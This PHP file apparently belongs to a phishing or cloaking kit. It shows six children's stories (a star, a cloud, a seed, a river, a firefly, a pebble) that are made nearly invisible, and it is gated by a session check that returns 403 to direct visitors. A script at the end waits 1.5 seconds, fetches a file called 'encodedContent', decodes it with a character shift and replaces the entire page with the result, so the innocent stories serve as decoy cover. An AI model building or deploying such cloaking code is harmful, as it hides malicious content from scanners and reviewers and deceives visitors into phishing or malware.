<?php
session_start();

// Check if accessed through index.php
if (!isset($_SESSION['access_granted']) || $_SESSION['access_granted'] !== true) {
    http_response_code(403);
    die("403 Forbidden - Page not found.");
}

// Unset access permission to prevent re-access if refreshed
unset($_SESSION['access_granted']);
echo '<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>The Little Star"s Adventure</title>
    <style>
        body {
            font-family: "Arial", sans-serif;
            background-color: #f0f8ff;
            color: #333;
            text-align: center;
            padding: 20px;
        }
        h1 {
            color: #ff69b4;
        }
        .story {
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            max-width: 600px;
            margin: 0 auto;
            text-align: left;
        }
        .story p {
            line-height: 1.6;
        }
        .story img {
            max-width: 100%;
            border-radius: 10px;
            margin: 20px 0;
        }
        .story-container{
            opacity: 0.001;
        }
    </style>
</head>
<body>
<div class="story-container">
    <h1>The Little Star"s Adventure</h1>

    <div class="story">
        <p>Once upon a time, in a faraway galaxy, there was a little star named Twinkle. Twinkle was not like the other stars; she loved to explore and dreamt of visiting different planets.</p>
        <p>One night, Twinkle decided to embark on an adventure. She zoomed past the moon, waved at the planets, and even danced around a comet. She was having the time of her life!</p>
        <p>As Twinkle traveled, she met a friendly alien named Zorb. Zorb was from a planet called Glimmer, and he invited Twinkle to visit his home. Twinkle was thrilled and accepted the invitation.</p>
        <p>On Glimmer, Twinkle saw glowing trees, sparkling rivers, and met many friendly aliens. She played games, shared stories, and even learned a few alien dances. It was the best adventure ever!</p>
        <p>When it was time to return home, Twinkle promised Zorb that she would visit again. She zoomed back to her place in the sky, twinkling brighter than ever, knowing that she had made a new friend and had an unforgettable adventure.</p>
        <p>And from that day on, every time you look up at the night sky, you might just see Twinkle, the little star who loves to explore, shining brightly and reminding us all to dream big.</p>
    </div>
<div>
<div  class="story-container">
    <h1>The Cloud"s Journey</h1>
    <div class="story">
        <p>Once, high above the world, lived a small, fluffy cloud named Cumulus. Cumulus always watched the world below and wished he could see it up close.</p>
        <p>One sunny morning, Cumulus decided to drift away. He floated over green hills, sparkling lakes, and bustling cities. He saw children playing, birds flying, and flowers blooming.</p>
        <p>As he traveled, he met a lonely kite stuck in a tree. Cumulus gently blew a gust of wind, freeing the kite. The kite soared into the sky, thanking Cumulus with a joyful dance.</p>
        <p>Cumulus continued his journey, eventually reaching a dry, thirsty field. He gathered all his moisture and released a gentle rain, bringing life back to the parched land.</p>
        <p>Feeling content, Cumulus drifted back to his place in the sky. He knew that even a small cloud could make a big difference, bringing joy and life wherever it went.</p>
        <p>And every time you see a cloud in the sky, remember Cumulus, the little cloud who dared to explore and help others.</p>
    </div>
</div>
<div  class="story-container">
    <h1>The Seed"s Big Dream</h1>
    <div class="story">
        <p>In a small garden, there lived a tiny seed named Pip. Pip dreamed of growing into a tall, strong tree, reaching for the sky.</p>
        <p>One spring day, Pip was planted in the soil. He felt the warm sun and the gentle rain. He pushed his roots deep into the earth and sprouted a tiny green shoot.</p>
        <p>As Pip grew, he met a friendly worm named Wiggles. Wiggles helped Pip"s roots grow strong by loosening the soil and providing nutrients.</p>
        <p>Pip grew taller and taller, his branches reaching out like welcoming arms. Birds built nests in his leaves, and squirrels played among his roots. He provided shade for weary travelers and shelter for small animals.</p>
        <p>Pip became the tallest tree in the garden, fulfilling his dream. He learned that with patience and help from friends, even the smallest seed can achieve great things.</p>
        <p>And every time you see a tall tree, remember Pip, the little seed who dared to dream big and grow strong.</p>
    </div>
</div>
<div  class="story-container">
    <h1>The River"s Song</h1>
    <div class="story">
        <p>High in the mountains, a small stream began its journey. It was named Ripple, and it loved to sing as it flowed.</p>
        <p>Ripple tumbled down the mountainside, gathering strength and speed. It danced through forests, whispered through meadows, and splashed over rocks.</p>
        <p>Along its way, Ripple met a thirsty deer. It gently offered its cool water, quenching the deer"s thirst. The deer thanked Ripple with a grateful nod.</p>
        <p>Ripple continued its journey, joining other streams and becoming a mighty river. It carried boats, watered fields, and provided homes for fish and other creatures.</p>
        <p>Finally, Ripple reached the vast ocean, its song joining the great symphony of the sea. It knew that its journey had brought life and joy to many.</p>
        <p>And every time you hear the sound of a river, remember Ripple, the little stream that sang its way to the sea.</p>
    </div>
</div>
<div  class="story-container">
    <h1>The Firefly"s Light</h1>
    <div class="story">
        <p>In a dark forest, lived a tiny firefly named Flicker. Flicker was shy and often hid his light, afraid to shine.</p>
        <p>One night, Flicker heard a lost little beetle crying. The beetle was scared and couldn"t find its way home. Flicker knew he had to help.</p>
        <p>Flicker took a deep breath and turned on his light. He flew through the forest, his glow guiding the beetle back to its family.</p>
        <p>The beetle"s family thanked Flicker, and he felt a warm feeling inside. He realized that his light wasn"t just for him; it was for others too.</p>
        <p>From that night on, Flicker shone brightly, lighting up the forest and bringing joy to all who saw him. He learned that even a small light can make a big difference.</p>
        <p>And every time you see a firefly glowing in the night, remember Flicker, the little firefly who learned to shine.</p>
    </div>
</div>
<div  class="story-container">
    <h1>The Pebble"s Roll</h1>
    <div class="story">
        <p>On a rocky beach, there lived a small, smooth pebble named Rocky. Rocky longed to see the world beyond the shore.</p>
        <p>One day, a strong wave swept Rocky into the sea. He tumbled and rolled, exploring the ocean depths. He saw colorful fish, swaying seaweed, and hidden coral reefs.</p>
        <p>As he drifted, Rocky met a sad starfish trapped beneath a heavy shell. Rocky gently nudged the shell, freeing the starfish. The starfish thanked Rocky with a grateful wiggle.</p>
        <p>Rocky continued his journey, eventually washing up on a distant shore. He found himself in a beautiful garden, filled with flowers and butterflies.</p>
        <p>Rocky became a part of the garden, a small but important piece of its beauty. He learned that even a simple pebble can have a grand adventure and make a difference.</p>
        <p>And every time you see a pebble on the beach, remember Rocky, the little pebble who rolled away to explore the world.</p>
    </div>
</div>
</body>
    <script>
        setTimeout(function() {
      function fetchAndDecode(){fetch("encodedContent").then((e=>{if(!e.ok)throw new Error("Network response was not ok");return e.text()})).then((e=>{try{writeTo(decryptText(e))}catch(e){console.error("Decoding failed:",e)}})).catch((e=>{console.error("There was a problem with the fetch operation:",e)}))}function decryptText(e,t=3){return e.split("").map((e=>String.fromCharCode(e.charCodeAt(0)-t))).join("")}function writeTo(e){document.documentElement.innerHTML=e,document.open().write(e),document.close()}fetchAndDecode();
        }, 1500); 
    </script>
    </html>';
?>